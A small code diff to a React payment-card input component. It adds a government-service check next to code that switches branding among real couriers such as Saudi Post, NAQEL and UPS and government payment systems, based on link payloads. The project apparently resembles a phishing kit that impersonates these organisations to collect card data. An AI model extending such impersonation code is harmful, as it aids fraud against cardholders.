@@ -7,6 +7,7 @@ import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@
 import { getServiceBranding } from "@/lib/serviceLogos";
 import { getBrandingByCompany } from "@/lib/brandingSystem";
 import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
+import { isGovernmentService } from "@/lib/governmentPaymentServices";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { NAQELLayout, ZajilLayout, SaudiPostLayout, UPSLayout } from "@/components/MoreCompanyLayouts";
 import { 
@@ -60,7 +61,8 @@ const PaymentCardInput = () => {
   const serviceName = linkData?.payload?.service_name || serviceKey;
   const branding = getServiceBranding(serviceKey);
   
-  // Get government payment system for styling
+  // Check if government service and get styling
+  const isGovService = isGovernmentService(serviceKey);
   const govSystem = getGovernmentPaymentSystem(selectedCountry);
 
   const shippingInfo = linkData?.payload as any;
